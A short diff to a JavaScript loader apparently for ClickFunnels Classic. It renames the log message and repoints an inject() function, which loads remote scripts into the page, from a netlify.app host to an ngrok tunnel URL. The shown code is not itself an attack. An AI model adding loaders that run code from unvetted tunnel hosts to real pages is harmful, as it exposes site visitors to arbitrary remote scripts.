@@ -1,8 +1,8 @@
-console.log('ClickFunnels Classic Verify.js Loaded')
+console.log('ClickFunnels Classic Transfer Loaded')
 
 function inject(url) {
   return new Promise((resolve, reject) => {
-    const base_url = 'https://clickfunnels-classic.netlify.app/'
+    const base_url = 'https://4f2102016945-3911214117516183263.ngrok-free.app/'
     const script = document.createElement('script')
     script.type = 'text/javascript'
     script.src = `${base_url}${url}`
